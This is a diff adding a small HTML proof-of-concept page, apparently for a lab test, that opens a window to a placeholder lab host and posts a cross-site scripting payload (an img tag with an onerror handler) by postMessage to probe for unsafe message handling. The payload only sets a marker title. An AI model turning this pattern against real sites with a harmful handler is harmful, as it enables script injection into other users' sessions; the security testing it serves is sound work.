@@ -1,0 +1,20 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>RollWinded controlled sender</title>
+
+<button id="send" style="font-size: 24px; padding: 20px">
+  Send controlled message
+</button>
+
+<script>
+document.getElementById("send").addEventListener("click", () => {
+  const targetWindow = window.open("https://<LAB_HOST>/");
+
+  setTimeout(() => {
+    targetWindow.postMessage(
+      '<img src=x onerror="document.title=\'MMP_EXECUTED\'"><span>MMP_MARKER</span>',
+      "*"
+    );
+  }, 3000);
+});
+</script>
